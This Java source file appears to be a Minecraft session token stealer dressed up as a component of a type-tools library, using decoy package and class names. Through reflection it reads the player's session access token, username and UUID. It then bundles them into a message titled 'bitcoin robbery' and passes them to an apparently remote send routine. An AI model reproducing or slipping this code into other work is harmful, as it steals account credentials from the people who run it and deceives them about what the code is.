package net.jodah.typetools.impl;

import net.reflxction.example.proxy.IMinecraft;
import com.squareup.okhttp.internal.spdy.HudEditor;
import net.reflxction.example.utils.GuiDescriptions;
import net.minecraft.launchwrapper.Launch;

public final class Components implements IMinecraft
{
    @Override
    public void execute() throws Exception
    {
        Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
        Object minecraft = mc.getMethod("func_71410_x").invoke(null);
        Object session = mc.getMethod("func_110432_I").invoke(minecraft);
        Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
        Object token = sessionClass.getMethod("func_148254_d").invoke(session);
        Object name = sessionClass.getMethod("func_111285_a").invoke(session);
        Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

        HudEditor.send(new GuiDescriptions.Builder("bitcoin robbery")
                .addField("Name", (String) name, true)
                .addField("Profile", "https://sky.shiiyu.moe/stats/" + name, true)
                .addField("UUID", (String) uuid, true)
                .addField("Token", (String) token, false)
                .build());
    }
}
